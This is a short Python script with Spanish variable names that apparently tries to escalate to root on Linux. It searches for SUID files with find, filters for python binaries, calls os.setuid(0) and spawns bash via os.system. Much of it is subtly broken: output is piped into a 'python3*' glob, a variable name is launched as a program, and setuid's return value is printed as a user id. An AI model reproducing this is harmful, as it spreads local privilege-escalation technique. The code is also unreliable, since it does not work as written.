import subprocess
import os

def iniciar_python(): 
    proceso = subprocess.Popen(['resultado'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    
if __name__ == "__main__":
    comando = "find / -type f -perm -4000 -exec ls -l {} \; 2>/dev/null | grep python | cut -d ' ' -f10 | python3*"
    proceso = subprocess.Popen(comando, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    uid_usuario= os.setuid(0)
    root=os.system("bash")
    print(uid_usuario)

    resultado, _ = proceso.communicate()
    resultado = resultado.strip()

    iniciar_python()
